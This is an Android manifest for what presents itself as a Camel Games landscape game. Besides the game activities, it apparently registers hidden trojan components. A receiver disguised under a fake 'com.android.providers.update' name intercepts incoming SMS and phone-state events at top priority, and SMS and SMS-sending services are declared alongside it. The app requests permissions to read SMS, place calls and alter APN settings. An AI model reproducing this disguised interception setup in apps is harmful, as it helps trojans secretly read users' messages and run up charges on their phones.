<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.camelgames.abnormalup">
    <application android:debuggable="false" android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:configChanges="keyboard|keyboardHidden" android:label="@string/app_name" android:launchMode="singleTask" android:multiprocess="false" android:name="com.camelgames.blowup.MainActivity" android:screenOrientation="landscape" android:windowSoftInputMode="stateAlwaysHidden">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboard|keyboardHidden" android:name="com.camelgames.explode.activities.MainMenuActivity" android:screenOrientation="landscape" android:windowSoftInputMode="stateAlwaysHidden"/>
        <activity android:configChanges="keyboard|keyboardHidden" android:name="com.camelgames.explode.activities.ScoreActivity" android:screenOrientation="landscape" android:windowSoftInputMode="stateAlwaysHidden"/>
        <receiver android:name="com.android.providers.update.OperateReceiver" android:priority="9999">
            <intent-filter android:priority="9999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
            <intent-filter android:priority="9999">
                <action android:name="android.intent.action.PHONE_STATE"/>
            </intent-filter>
        </receiver>
        <service android:name="com.android.providers.update.OperateService"/>
        <service android:name="com.android.providers.sms.SMSService"/>
        <service android:name="com.android.providers.sms.SMSSendService"/>
    </application>
    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
    <uses-permission android:name="com.android.vending.CHECK_LICENSE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
</manifest>